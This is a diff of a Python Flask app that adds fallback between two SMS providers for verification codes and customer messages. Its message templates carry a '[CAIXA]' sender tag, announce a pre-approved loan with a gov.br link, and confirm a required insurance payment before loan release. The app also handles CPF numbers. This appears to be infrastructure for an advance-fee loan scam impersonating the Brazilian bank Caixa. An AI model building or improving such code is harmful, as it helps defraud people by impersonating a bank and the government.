@@ -181,19 +181,38 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
 # Função para enviar código de verificação tentando primeiro SMSDEV e depois Owen como fallback
 def send_verification_code(phone_number: str) -> tuple:
     """
-    Sends a verification code via SMSDEV API
+    Sends a verification code via the selected SMS API
     Returns a tuple of (success, code or error_message)
     """
     # Gerar código de verificação de 6 dígitos
     verification_code = ''.join(random.choices(string.digits, k=6))
     
-    app.logger.info(f"Enviando código de verificação via SMSDEV para {phone_number}")
+    # Determinar qual API usar com base na configuração
+    sms_api = os.environ.get('SMS_API', 'SMSDEV').upper()
+    app.logger.info(f"Enviando código de verificação via {sms_api} para {phone_number}")
     
-    # Usar apenas SMSDEV para enviar códigos de verificação
-    success, error = send_verification_code_smsdev(phone_number, verification_code)
+    # Tentar enviar usando SMSDEV por padrão
+    if sms_api == 'SMSDEV':
+        success, error = send_verification_code_smsdev(phone_number, verification_code)
+        
+        # Se falhar, tentar Owen como fallback
+        if not success and os.environ.get('OWEN_SMS_TOKEN'):
+            app.logger.info(f"SMSDEV falhou, tentando Owen como fallback para {phone_number}")
+            success, error = send_verification_code_owen(phone_number, verification_code)
     
-    # Retornar o resultado do envio
-    return (success, verification_code if success else error)
+    # Usar Owen como primeira opção se configurado
+    elif sms_api == 'OWEN':
+        success, error = send_verification_code_owen(phone_number, verification_code)
+        
+        # Se falhar, tentar SMSDEV como fallback
+        if not success and os.environ.get('SMSDEV_API_KEY'):
+            app.logger.info(f"Owen falhou, tentando SMSDEV como fallback para {phone_number}")
+            success, error = send_verification_code_smsdev(phone_number, verification_code)
+    
+    # Configuração inválida
+    else:
+        app.logger.error(f"API SMS inválida configurada: {sms_api}")
+        return False, "Configuração inválida de API SMS"
     
     if success:
         return True, verification_code
@@ -334,7 +353,7 @@ def send_sms_owen(phone_number: str, message: str) -> bool:
 # Função para enviar SMS tentando primeiro SMSDEV e depois Owen como fallback
 def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
     """
-    Send SMS notification about the loan approval using ONLY SMSDEV API
+    Send SMS notification about the loan approval
     Returns success status (boolean)
     """
     first_name = full_name.split()[0] if full_name else "Cliente"
@@ -343,43 +362,39 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
     # Construir a mensagem
     message = f"[CAIXA] Prezado(a) {first_name}, seu empréstimo no valor de {formatted_amount} foi pré-aprovado! Clique no link para continuar: http://gov.br/emprestimo"
     
-    # Usando apenas a API SMSDEV
-    app.logger.info(f"[PROD] Enviando SMS via SMSDEV para {phone_number}")
+    # Determinar qual API usar com base na configuração
+    sms_api = os.environ.get('SMS_API', 'SMSDEV').upper()
+    app.logger.info(f"[PROD] Enviando SMS via {sms_api} para {phone_number}")
     
-    # Tentar enviar até 3 vezes através do SMSDEV
-    max_attempts = 3
-    attempt = 0
-    success = False
-    
-    while attempt < max_attempts and not success:
-        attempt += 1
-        app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS via SMSDEV")
+    # Tentar enviar usando SMSDEV por padrão
+    if sms_api == 'SMSDEV':
+        success = send_sms_smsdev(phone_number, message)
         
-        try:
+        # Se falhar, tentar Owen como fallback
+        if not success and os.environ.get('OWEN_SMS_TOKEN'):
+            app.logger.info(f"[PROD] SMSDEV falhou, tentando Owen como fallback para {phone_number}")
+            success = send_sms_owen(phone_number, message)
+    
+    # Usar Owen como primeira opção se configurado
+    elif sms_api == 'OWEN':
+        success = send_sms_owen(phone_number, message)
+        
+        # Se falhar, tentar SMSDEV como fallback
+        if not success and os.environ.get('SMSDEV_API_KEY'):
+            app.logger.info(f"[PROD] Owen falhou, tentando SMSDEV como fallback para {phone_number}")
             success = send_sms_smsdev(phone_number, message)
-            
-            if success:
-                app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt}")
-                break
-            else:
-                app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}")
-                if attempt < max_attempts:
-                    time.sleep(1)  # Esperar um segundo antes da próxima tentativa
-        except Exception as e:
-            app.logger.error(f"[PROD] Erro ao enviar SMS na tentativa {attempt}: {str(e)}")
-            if attempt < max_attempts:
-                time.sleep(1)
     
-    if not success:
-        app.logger.error(f"[PROD] Falha ao enviar SMS via SMSDEV após {max_attempts} tentativas")
-        
+    # Configuração inválida
+    else:
+        app.logger.error(f"[PROD] API SMS inválida configurada: {sms_api}")
+        return False
+    
     return success
 
 # Função para enviar SMS de confirmação de pagamento
 def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
     """
     Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
-    usando EXCLUSIVAMENTE a API SMSDEV por causa do encurtador de URL
     """
     # Limpar o telefone e pegar apenas o primeiro nome
     clean_phone = re.sub(r'\D', '', phone_number)
@@ -392,10 +407,10 @@ def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_
     # Criar mensagem com link para página de agradecimento
     message = f"[CAIXA] Olá {first_name}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
     
-    # Usando apenas SMSDEV por causa do encurtador de URL
-    app.logger.info(f"[PROD] Configurando para uso exclusivo da API SMSDEV para encurtamento de URL")
+    # Determinar qual API usar, mas sempre usar SMSDEV por padrão por causa do encurtador de URL
+    sms_api = 'SMSDEV'
     
-    # Tentar até 3 vezes com SMSDEV
+    # Tentar até 3 vezes com SMSDEV por causa do encurtador de URL
     max_attempts = 3
     attempt = 0
     success = False
@@ -412,8 +427,11 @@ def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_
             app.logger.info(f"[PROD] Tentativa {attempt} falhou, tentando novamente em 2 segundos...")
             time.sleep(2)
     
-    if not success:
-        app.logger.error(f"[PROD] Falha ao enviar SMS via SMSDEV após {max_attempts} tentativas")
+    # Se todas as tentativas com SMSDEV falharem, tentar com Owen como último recurso
+    # (mas perderemos o encurtador de URL)
+    if not success and os.environ.get('OWEN_SMS_TOKEN'):
+        app.logger.info(f"[PROD] Todas as tentativas com SMSDEV falharam, tentando Owen como último recurso")
+        success = send_sms_owen(clean_phone, message)
     
     return success
 
